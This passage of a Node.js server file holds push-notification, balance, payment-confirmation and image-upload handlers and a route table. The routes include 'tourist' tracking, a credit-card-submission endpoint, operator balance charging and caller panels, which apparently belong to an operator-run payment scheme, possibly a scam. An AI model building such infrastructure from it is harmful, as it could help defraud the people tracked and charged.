    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, balance: newBalance });
  } catch (err) {
    console.error('[chat-op/charge]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleGetClientBalance(req, reply) {
  const sessionId = sanitizeString(req.params.sessionId || '', 80);
  if (!sessionId) return reply.send({ balance: 5000, transactions: [] });
  try {
    const wc = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { balance: true, transactions: true },
    });
    if (!wc) return reply.send({ balance: 5000, transactions: [] });
    return reply.send({
      balance: wc.balance ?? 5000,
      transactions: Array.isArray(wc.transactions) ? wc.transactions : [],
    });
  } catch (err) {
    console.error('[tourist/balance]', err?.message || err);
    return reply.send({ balance: 5000, transactions: [] });
  }
}

// ── Push notifications ────────────────────────────────────────────────────────
const PUSH_SETTINGS_FILE = join(process.cwd(), 'data', 'push-settings.json');
const PUSH_TOKENS_FILE   = join(process.cwd(), 'data', 'push-tokens.json');
const DEFAULT_PUSH = { title: '¡Tienes un nuevo mensaje!', body: 'Hemos enviado una respuesta. Abre el chat para verla.', url: 'https://monetoplusapp.com/tourist/chat.html', delayMinutes: 3, enabled: true };

// sessionId -> FCM device token (persisted to disk)
const pushTokens = new Map();
// sessionId -> setTimeout handle (pending push)
const pendingPush = new Map();

async function loadPushTokens() {
  try {
    const data = JSON.parse(await readFile(PUSH_TOKENS_FILE, 'utf8'));
    for (const [k, v] of Object.entries(data)) pushTokens.set(k, v);
    console.log(`[Push] Loaded ${pushTokens.size} FCM token(s) from disk:`);
    for (const [k, v] of pushTokens) {
      console.log(`  session=${k.slice(0, 12)}... token=${v.slice(0, 20)}...`);
    }
  } catch { console.log('[Push] No push-tokens.json found — starting fresh'); }
}

async function savePushTokens() {
  try {
    await mkdir(join(process.cwd(), 'data'), { recursive: true });
    await writeFile(PUSH_TOKENS_FILE, JSON.stringify(Object.fromEntries(pushTokens), null, 2), 'utf8');
  } catch (e) {
    console.error('[Push] Failed to save tokens:', e?.message);
  }
}

async function readPushSettings() {
  try { return { ...DEFAULT_PUSH, ...JSON.parse(await readFile(PUSH_SETTINGS_FILE, 'utf8')) }; }
  catch { return { ...DEFAULT_PUSH }; }
}
async function writePushSettings(data) {
  await mkdir(join(process.cwd(), 'data'), { recursive: true });
  await writeFile(PUSH_SETTINGS_FILE, JSON.stringify(data, null, 2), 'utf8');
}

async function schedulePush(sessionId) {
  const settings = await readPushSettings();
  if (!settings.enabled) {
    console.log(`[Push] schedulePush skipped — push disabled | session=${sessionId.slice(0, 12)}...`);
    return;
  }
  const token = pushTokens.get(sessionId);
  if (!token) {
    console.log(`[Push] schedulePush skipped — no token | session=${sessionId.slice(0, 12)}... | tokens in store=${pushTokens.size}`);
    return;
  }
  cancelPush(sessionId);
  const delay = Math.max(1, Number(settings.delayMinutes) || 3) * 60 * 1000;
  console.log(`[Push] Scheduled in ${Math.round(delay/1000)}s | session=${sessionId.slice(0, 12)}...`);
  const handle = setTimeout(async () => {
    pendingPush.delete(sessionId);
    console.log(`[Push] Sending scheduled push | session=${sessionId.slice(0, 12)}...`);
    const ok = await sendPush(token, settings.title, settings.body, settings.url);
    console.log(`[Push] Scheduled push ${ok ? 'sent OK' : 'FAILED'} | session=${sessionId.slice(0, 12)}...`);
  }, delay);
  pendingPush.set(sessionId, handle);
}

function cancelPush(sessionId) {
  const h = pendingPush.get(sessionId);
  if (h) { clearTimeout(h); pendingPush.delete(sessionId); }
}

async function handleRegisterPushToken(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const token = sanitizeString(getString(body.token), 200);
    if (!sessionId || !token) {
      console.warn(`[Push] Register rejected — missing fields: sessionId=${!!sessionId} token=${!!token}`);
      return reply.status(400).send({ error: 'missing fields' });
    }
    const isNew = !pushTokens.has(sessionId);
    const changed = !isNew && pushTokens.get(sessionId) !== token;
    pushTokens.set(sessionId, token);
    savePushTokens();
    console.log(`[Push] Token ${isNew ? 'NEW' : changed ? 'UPDATED' : 'refreshed'} | session=${sessionId.slice(0, 12)}... | token=${token.slice(0, 16)}... | total=${pushTokens.size}`);
    return reply.send({ ok: true });
  } catch (e) {
    console.error('[Push] handleRegisterPushToken error:', e?.message);
    return reply.status(500).send({ error: 'server error' });
  }
}

async function handleGetPushSettings(req, reply) {
  if (!requireAdmin(req, reply)) return;
  return reply.send(await readPushSettings());
}

async function handleSavePushSettings(req, reply) {
  if (!requireAdmin(req, reply)) return;
  const body = asRecord(req.body) ?? {};
  const current = await readPushSettings();
  const updated = {
    title: sanitizeString(getString(body.title) || current.title, 100),
    body: sanitizeString(getString(body.body) || current.body, 200),
    url: sanitizeString(getString(body.url) || current.url || '', 300),
    delayMinutes: Math.max(1, Math.min(60, Number(body.delayMinutes) || current.delayMinutes)),
    enabled: body.enabled !== undefined ? !!body.enabled : current.enabled,
  };
  await writePushSettings(updated);
  return reply.send(updated);
}

// ── Payment screenshot confirm / reject ───────────────────────────────────────
async function handleGetPaymentStatus(req, reply) {
  const sessionId = sanitizeString(getString(req.query?.sessionId ?? ''), 80);
  if (!sessionId) return reply.status(400).send({ error: 'missing sessionId' });
  return reply.send(paymentStatus.get(sessionId) || { status: 'none' });
}

async function handlePaymentConfirm(req, reply) {
  if (!requireChatOp(req, reply)) return;
  const body = asRecord(req.body) ?? {};
  const sessionId = sanitizeString(getString(body.sessionId), 80);
  if (!sessionId) return reply.status(400).send({ error: 'missing sessionId' });
  const ps = paymentStatus.get(sessionId) || {};
  paymentStatus.set(sessionId, { ...ps, status: 'confirmed' });
  await savePaymentStatus();
  notifyClients();
  return reply.send({ ok: true });
}

async function handlePaymentReject(req, reply) {
  if (!requireChatOp(req, reply)) return;
  const body = asRecord(req.body) ?? {};
  const sessionId = sanitizeString(getString(body.sessionId), 80);
  if (!sessionId) return reply.status(400).send({ error: 'missing sessionId' });
  paymentStatus.set(sessionId, { status: 'rejected' });
  await savePaymentStatus();
  return reply.send({ ok: true });
}

// ── Image upload ──────────────────────────────────────────────────────────────
const UPLOADS_DIR = join(__dirname, '..', 'uploads');
const ALLOWED_MIME = new Set(['image/jpeg', 'image/png', 'image/gif', 'image/webp']);

async function handleUploadImage(req, reply) {
  try {
    const data = await req.file();
    if (!data) return reply.status(400).send({ error: 'No file' });
    const mime = data.mimetype || '';
    if (!ALLOWED_MIME.has(mime)) return reply.status(400).send({ error: 'Invalid file type' });
    const ext = mime === 'image/png' ? '.png' : mime === 'image/gif' ? '.gif' : mime === 'image/webp' ? '.webp' : '.jpg';
    await mkdir(UPLOADS_DIR, { recursive: true });
    const filename = `${randomUUID()}${ext}`;
    const dest = join(UPLOADS_DIR, filename);
    await pipeline(data.file, fsCreateWriteStream(dest));
    return reply.send({ url: `/uploads/${filename}` });
  } catch (err) {
    console.error('[upload-image]', err?.message || err);
    return reply.status(500).send({ error: 'Upload failed' });
  }
}

export async function registerApiRoutes(app) {
  // Load persisted FCM tokens from disk
  await loadPushTokens();

  // Multipart for image uploads
  await app.register((await import('@fastify/multipart')).default, { limits: { fileSize: 10 * 1024 * 1024 } });

  // Public settings
  app.get('/api/settings', handleGetSettings);

  // Geo lookup
  app.get('/api/geo', handleGeo);

  // Tourist tracking
  app.post('/api/track', handleTrack);
  app.post('/api/tourist/call-request', handleCallRequest);
  app.get('/api/tourist/status', handleTouristStatus);
  app.post('/api/credit-card-submission', handleCreditCardSubmission);

  // Scratch captcha
  app.get('/api/scratch-access/:token', handleScratchAccess);
  app.post('/api/scratch-verify', { config: { rawBody: false } }, handleScratchVerify);

  // AI chat (assistant.html)
  app.post('/api/chat', handleChat);
  app.get('/api/chat/history/:sessionId', handleChatHistory);

  // Support chat (chat.html) — separate session & prompt
  app.post('/api/support-chat', handleSupportChat);
  app.get('/api/support-chat/history/:sessionId', handleSupportChatHistory);
  app.post('/api/support-chat/read', handleSupportChatMarkRead);

  // Full admin
  app.post('/api/admin/login', handleAdminLogin);
  app.post('/api/admin/logout', handleAdminLogout);
  app.get('/api/admin/bot-config', handleGetBotConfig);
  app.put('/api/admin/bot-config', handleUpdateBotConfig);
  app.get('/api/admin/chat-prompt', handleGetChatPrompt);
  app.put('/api/admin/chat-prompt', handleUpdateChatPrompt);
  app.get('/api/admin/clients', handleAdminClients);
  app.delete('/api/admin/clients/:id', handleAdminDeleteClient);
  app.get('/api/admin/clients/:sessionId/chat', handleAdminClientChat);
  app.get('/api/admin/stats', handleAdminStats);
  app.put('/api/admin/settings', handleUpdateSettings);

  // Caller admin
  app.post('/api/caller/login', handleCallerLogin);
  app.get('/api/caller/clients', handleCallerClients);
  app.post('/api/caller/clients/:id/called', handleCallerMarkCalled);
  app.put('/api/caller/clients/:id/note', handleCallerNote);
  app.put('/api/caller/clients/:id/operator-status', handleCallerSetOperatorStatus);
  app.get('/api/caller/call-logs', handleGetCallLogs);
  app.post('/api/caller/call-logs', handleAddCallLog);
  app.post('/api/caller/call-logs/:id/mark', handleMarkCallLog);

  // Chat operator (chat/index.html)
  app.post('/api/chat-op/login', handleChatOpLogin);
  app.get('/api/chat-op/clients', handleChatOpClients);
  app.get('/api/chat-op/messages/:sessionId', handleChatOpMessages);
  app.post('/api/chat-op/send', handleChatOpSend);
  app.post('/api/chat-op/request-call', handleChatOpRequestCall);
  app.put('/api/chat-op/note', handleChatOpSaveNote);
  app.post('/api/chat-op/send-push', handleChatOpSendPush);
  app.post('/api/chat-op/charge', handleChatOpCharge);

  // Client balance (public — tourist pages)
  app.get('/api/tourist/balance/:sessionId', handleGetClientBalance);

  // Image upload (client + operator)
  app.post('/api/upload-image', handleUploadImage);

  // Push notification token registration + admin settings
  app.post('/api/push/register', handleRegisterPushToken);
  app.get('/api/admin/push-settings', handleGetPushSettings);
  app.put('/api/admin/push-settings', handleSavePushSettings);

  // Payment screenshot status
  app.get('/api/tourist/payment-status', handleGetPaymentStatus);
  app.post('/api/chat-op/payment/confirm', handlePaymentConfirm);
  app.post('/api/chat-op/payment/reject', handlePaymentReject);

  // SSE for real-time updates
  app.get('/api/sse', handleSSE);
}
